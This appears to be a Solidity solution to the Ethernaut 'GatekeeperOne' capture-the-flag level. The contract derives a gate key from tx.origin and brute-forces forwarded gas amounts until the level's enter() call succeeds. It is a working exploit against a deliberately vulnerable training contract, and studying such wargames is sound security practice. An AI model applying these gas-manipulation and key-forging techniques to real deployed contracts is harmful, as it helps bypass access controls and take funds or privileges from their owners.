// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperOne} from "../levels/GatekeeperOne.sol";
import {console2} from "forge-std/console2.sol";

contract GateKeeperOneAttack {
    GatekeeperOne instance;

    constructor(address _instance) {
        instance = GatekeeperOne(_instance);
    }

    function attack() public payable {
        bytes8 _gateKey = bytes8(
            uint64(uint16(uint160(tx.origin)) + (1 << 63))
        );

        for (uint256 i = 0; i < 120; i++) {
            uint256 gasToForward = 8191 * 3 + i + 150;

            try instance.enter{gas: gasToForward}(_gateKey) {
                console2.log("Done!");
                return;
            } catch {}
        }

        revert("Failed");
    }
}
